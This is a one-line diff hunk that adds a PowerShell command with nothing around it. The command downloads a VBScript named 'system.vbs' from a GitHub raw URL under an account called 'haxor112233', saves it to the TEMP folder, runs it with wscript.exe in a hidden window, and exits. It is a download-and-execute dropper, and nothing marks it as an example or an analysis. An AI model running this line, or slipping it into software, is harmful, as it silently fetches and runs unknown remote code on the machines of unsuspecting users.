@@ -1,0 +1,1 @@
+$url='https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/system.vbs'; $path=[System.IO.Path]::Combine($env:TEMP, 'system.vbs'); Invoke-WebRequest -Uri $url -OutFile $path; Start-Process 'wscript.exe' -ArgumentList $path -WindowStyle Hidden; exit
